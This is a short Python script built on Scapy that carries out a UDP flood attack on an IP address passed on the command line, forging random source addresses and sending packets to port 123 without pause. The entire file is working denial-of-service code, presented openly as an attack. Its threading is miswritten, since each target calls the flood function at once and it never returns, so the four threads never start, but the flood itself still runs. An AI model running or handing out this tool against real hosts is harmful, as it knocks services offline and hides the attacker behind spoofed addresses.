from scapy.all import *
import threading

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

address = str(sys.argv[1])

print("Performing a udp flood attack on " + address)

def udp_flood():
    packet = IP(dst=address, src=RandIP())/UDP(sport=RandShort(), dport=123)/"FloodingYou"
    try:
        send(packet, loop=True, inter=0.000001, verbose=0)
    except KeyboardInterrupt:
        print("Attacck interrupted")

tr1 = threading.Thread(target=udp_flood())
tr2 = threading.Thread(target=udp_flood())
tr3 = threading.Thread(target=udp_flood())
tr4 = threading.Thread(target=udp_flood())

tr1.start()
tr2.start()
tr3.start()
tr4.start()